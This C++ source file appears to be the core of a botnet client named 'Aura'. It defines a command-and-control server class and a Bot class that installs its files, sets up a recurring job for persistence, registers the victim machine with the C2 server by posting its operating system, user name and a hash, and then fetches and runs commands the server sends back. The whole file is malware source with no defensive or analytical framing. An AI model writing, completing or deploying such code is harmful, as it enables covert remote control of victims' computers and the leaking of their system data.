#include <memory>
#include <string>

#include "command.hh"
#include "request.hh"
#include "seed.hh"
#include "system.hh"

const std::string HASH_TYPE("SHA256");

class C2Server {
   public:
    C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
        registerUrl_ = registerUrl;
        cmdUrl_ = cmdUrl;
    }

    std::string getRegisterUrl() { return registerUrl_; }
    std::string getCmdUrl() { return cmdUrl_; }

   private:
    std::string registerUrl_, cmdUrl_;
};

class Bot {
   public:
    Bot(const std::string& seedPath, const std::string& regUrl,
        const std::string& cmdUrl) {
        hashType_ = HASH_TYPE;
        seed_ = std::make_unique<Seed>(seedPath);
        c2Server_ = std::make_unique<C2Server>(regUrl, cmdUrl);
    }

    void init();
    bool isInit();
    void registerBot();
    void executeCommand();

   private:
    std::string hashType_, hashSum_, os_, user_;
    std::unique_ptr<Seed> seed_;
    std::unique_ptr<C2Server> c2Server_;

    void prepareSysInfo_();
};

void Bot::init() {
    // Install files and components
    install::installFiles();
    seed_->initSeed();
    registerBot();
    install::initRecurringJob();
}

bool Bot::isInit() { return seed_->exists(); }

void Bot::registerBot() {
    // Register bot with C2 server
    prepareSysInfo_();
    request::PostForm postForm;
    postForm.addField("version", AURA_VERSION);
    postForm.addField("hash_type", hashType_);
    postForm.addField("hash_sum", hashSum_);
    postForm.addField("operating_sys", os_);
    postForm.addField("user", user_);
    request::post(c2Server_->getRegisterUrl(), postForm.toString());
}

void Bot::executeCommand() {
    // Update system info and create POST form
    prepareSysInfo_();
    request::PostForm postForm;
    postForm.addField("version", AURA_VERSION);
    postForm.addField("hash_sum", hashSum_);

    std::string response =
        request::post(c2Server_->getCmdUrl(), postForm.toString());

    // Parse response and execute based on parameters
    Command cmd(response);
    cmd.execute();
}

void Bot::prepareSysInfo_() {
    // Init or retrieve seed
    if (seed_->exists()) {
        seed_->getSeed();
    } else {
        seed_->initSeed();
    }

    // Retrieve values if they haven't been already
    if (!(hashSum_.size())) {
        hashSum_ = seed_->getHash();
    }
    if (!(os_.size())) {
        os_ = util::getOS();
    }
    if (!(user_.size())) {
        user_ = util::getUser();
    }
}
